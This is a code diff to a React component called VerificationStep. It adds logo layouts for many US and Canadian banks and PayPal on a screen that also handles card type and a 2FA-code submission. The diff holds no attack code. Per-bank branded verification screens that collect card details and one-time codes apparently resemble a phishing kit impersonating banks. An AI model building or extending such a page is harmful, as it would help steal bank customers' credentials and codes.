@@ -1,4 +1,5 @@
 import { CreditCard, Shield, Tally1 } from 'lucide-react';
+import { banks as americanBanks, canadianbanks } from '../data';
 
 interface VerificationStepsProps {
   selectedBank: string;
@@ -15,7 +16,12 @@ const VerificationStep = ({
   cardType,
   handle2FASubmit,
 }: VerificationStepsProps) => {
-  const bankData = banks.find((bnk) => bnk.name === selectedBank);
+
+
+    const allBanks = [...americanBanks, ...canadianbanks];
+
+  const bankData = allBanks.find((bnk) => bnk.name === selectedBank);
+
   const getCardIcon = (type: string) => {
     const iconClass = 'w-28 h-16 object-contain';
     switch (type) {
@@ -87,7 +93,78 @@ const VerificationStep = ({
           {getCardIcon(cardType)}
         </div>
       );
-    } else if (selectedBank === 'Bank of America') {
+    }
+else if (selectedBank === 'EQ Bank') {
+      return (
+        <div className="flex justify-between mt-10 mx-10">
+          <div className="w-full h-16 rounded-t-lg flex items-center">
+            <img
+              src={bankData?.additionalLogo}
+              className="w-[120px] h-[30px]"
+            />
+          </div>
+          {getCardIcon(cardType)}
+        </div>
+      );
+    }
+
+else if (selectedBank === 'Alterna Bank') {
+      return (
+        <div className="flex justify-between mt-10 mx-10">
+          <div className="w-full h-16 rounded-t-lg flex items-center">
+            <img
+              src={bankData?.additionalLogo}
+              className="w-[120px] h-[30px]"
+            />
+          </div>
+          {getCardIcon(cardType)}
+        </div>
+      );
+    }
+else if (selectedBank === 'Laurentian Bank of Canada' || selectedBank === 'HSBC Bank of Canada'|| selectedBank === 'Toronto-Dominion Bank' || selectedBank === 'Royal Bank of Canada') {
+      return (
+        <div className="flex justify-between mt-10 mx-10">
+          <div className="w-full h-16 rounded-t-lg flex items-center">
+            <img
+              src={bankData?.additionalLogo}
+              className="w-[200px] h-[100px]"
+            />
+          </div>
+          {getCardIcon(cardType)}
+        </div>
+      );
+    }
+
+else if (selectedBank === 'Simplii Financial' || selectedBank === 'Desjardins Group'  || selectedBank === 'National Bank of Canada' || selectedBank === 'Bank of Montreal'  || selectedBank === 'Canadian Imperial Bank of Commerce' || selectedBank === 'Scotiabank') {
+      return (
+        <div className="flex justify-between mt-10 mx-10">
+          <div className="w-full h-16 rounded-t-lg flex items-center">
+            <img
+              src={bankData?.additionalLogo}
+              className="w-[120px] h-[30px]"
+            />
+          </div>
+          {getCardIcon(cardType)}
+        </div>
+      );
+    }
+else if (selectedBank === 'PayPal') {
+      return (
+        <div className="flex justify-between mt-10 mx-10">
+          <div className="w-full h-16 rounded-t-lg flex items-center">
+            <img
+              src={bankData?.additionalLogo}
+              className="w-[140px] h-[30px]"
+            />
+          </div>
+          {getCardIcon(cardType)}
+        </div>
+      );
+    }
+
+
+
+else if (selectedBank === 'Bank of America') {
       return (
         <div className="flex justify-between mt-10 mx-10">
           <div className="w-full h-16 rounded-t-lg flex items-center">
